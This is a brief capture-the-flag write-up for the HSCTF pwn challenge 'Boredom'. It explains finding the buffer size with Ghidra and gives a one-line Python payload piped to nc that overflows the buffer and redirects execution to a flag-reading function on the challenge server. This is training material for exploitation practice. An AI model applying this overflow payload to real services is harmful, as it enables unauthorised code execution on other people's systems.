##Boredom

Keith is bored and stuck at home. Give him some things to do.

Connect at nc pwn.hsctf.com 5002.

Note, if you're having trouble getting it to work remotely:

check your offset, the offset is slightly different on the remote server
the addresses are still the same

##Solution

Disassembled with ghidra the bin file and checked that the buffer was 216 locally (208 on server). We tested that if you put 220 "a" the program try to call a function at the address: "0x7f0061616161"
So i just used the command

```
python -c "print'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00'" | nc pwn.hsctf.com 5002
```
To trigger it + make it run the function flag (address 0x04011d5) to theg the flag.txt from the server
